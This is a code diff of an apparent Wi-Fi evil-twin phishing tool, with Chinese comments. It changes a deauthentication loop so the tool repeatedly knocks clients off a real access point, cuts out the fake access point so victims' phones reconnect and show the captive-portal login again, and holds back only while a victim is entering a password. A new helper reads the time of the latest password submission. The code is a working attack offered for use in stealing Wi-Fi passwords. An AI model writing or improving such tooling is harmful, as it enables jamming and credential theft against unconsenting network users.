@@ -155,16 +155,21 @@ def stop_services():
 
 def deauth_loop(target, iface):
     """攻击期间持续踢人：周期广播 deauth 让真 AP 客户端掉线，
-    直到验证通过自动关闭假 AP 或手动停止（stop_event 置位）。"""
+    直到验证通过自动关闭假 AP 或手动停止（stop_event 置位）。
+
+    关键逻辑：以"最近是否有密码提交"判断是否有人在交互——
+      - 60 秒内有密码提交 → 跳过本轮（不打断正在输密码的受害者）
+      - 无提交 → 执行踢人轮：闪断假 AP + 踢真 AP 客户端，
+        强制受害者手机重新关联 → 重新触发系统认证弹窗
+    """
     bssid, channel = target["bssid"], target["channel"]
-    log("持续踢人循环启动（每 30 秒广播 deauth，直到拿到正确密码）")
+    log("持续踢人循环启动（每 30 秒一轮；60 秒无密码提交则闪断假 AP 强制重连）")
     while not deauth_stop.is_set():
-        # 每轮先检查是否有受害者连上假 AP 正在输密码；有则跳过本轮，避免打断
-        clients = read_clients()
-        if clients:
-            time.sleep(5)
+        # 有人正在交互（最近 60 秒提交过密码）→ 跳过本轮，避免打断
+        if time.time() - last_post_ts() < 60:
+            deauth_stop.wait(10)
             continue
-        # 短暂切 monitor 广播 deauth，再恢复假 AP
+        # 短暂切 monitor 广播 deauth，再恢复假 AP（闪断 → 受害者重连 → 重新触发认证页）
         run(f"systemctl stop {UNITS['hostapd']} 2>/dev/null; systemctl reset-failed {UNITS['hostapd']} 2>/dev/null")
         run("pkill -9 -f hostapd-mana 2>/dev/null")
         time.sleep(1)
@@ -348,6 +353,15 @@ def read_clients():
         except Exception:
             pass
     return clients
+
+def last_post_ts():
+    """读取 portal.py 记录的最近一次密码提交时间戳（epoch 秒）。
+    用于判断受害者是否正在交互（60 秒内有提交 = 正在输密码）。"""
+    try:
+        with open(os.path.join(BASE_DIR, "last_post"), encoding="utf-8") as f:
+            return int(f.read().strip() or 0)
+    except Exception:
+        return 0
 
 # ---------------- 密码自动验证 ----------------
 def verify_password(pwd):
